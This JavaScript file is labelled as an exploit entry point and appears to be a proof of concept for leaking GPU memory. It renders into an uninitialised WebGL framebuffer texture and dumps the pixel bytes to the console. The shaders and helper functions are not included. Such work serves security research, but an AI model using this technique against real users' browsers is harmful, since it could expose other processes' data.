const KB = 1024;
const KB4 = KB * 4;
const PAGE_TEXTURE_W = 32;
const PAGE_TEXTURE_H = 32;

/**
* Entry point of the exploit
*/
function glitch() {
    // create gl context
    initGL();

    // enable shaders too be used
    let shader;
    shader = new Shader('vertex-shader', 'fragment-shader');
    shader.use();

    // create debug requirements
    initFramebuffer();
    initDebug();

    gl.drawArrays(gl.TRIANGLES, 0, 6);

    viewFramebuffer();
}

function viewFramebuffer() {
    var pixels = new Uint8Array(KB4);
    gl.readPixels(0, 0, PAGE_TEXTURE_W, PAGE_TEXTURE_H, gl.RGBA, gl.UNSIGNED_BYTE, pixels);

    for (let i = 0; i < KB4 - 4; i += 4) {
        console.log(`${pixels[i]},${pixels[i + 1]},${pixels[i + 2]},${pixels[i + 3]}  `);
    }
}

function initDebug() {
    const targetTexture = createTexture2DRGBA(null, PAGE_TEXTURE_W, PAGE_TEXTURE_H);

    // attach the texture as the first color attachment
    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, targetTexture, 0);
    if (gl.checkFramebufferStatus(gl.FRAMEBUFFER) != gl.FRAMEBUFFER_COMPLETE) {
        throw new Error('Framebuffer not complete! - ' + gl.checkFramebufferStatus(gl.FRAMEBUFFER));
    }

    createRectangle();
}

function createRectangle() {
    const positionBuffer = gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
    // draw 2 triangles
    const positions = [
        1, 1,   // top right
        1, -1,  // bottom right
        -1, -1,  // bottom left

        -1, -1,  // bottom left
        -1, 1,   // top left
        1, 1,   // top right
    ];
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(positions), gl.STATIC_DRAW);

    const vao = gl.createVertexArray();
    gl.bindVertexArray(vao);

    gl.vertexAttribPointer(0, 2, gl.FLOAT, false, 0, 0);
    gl.enableVertexAttribArray(0);
}
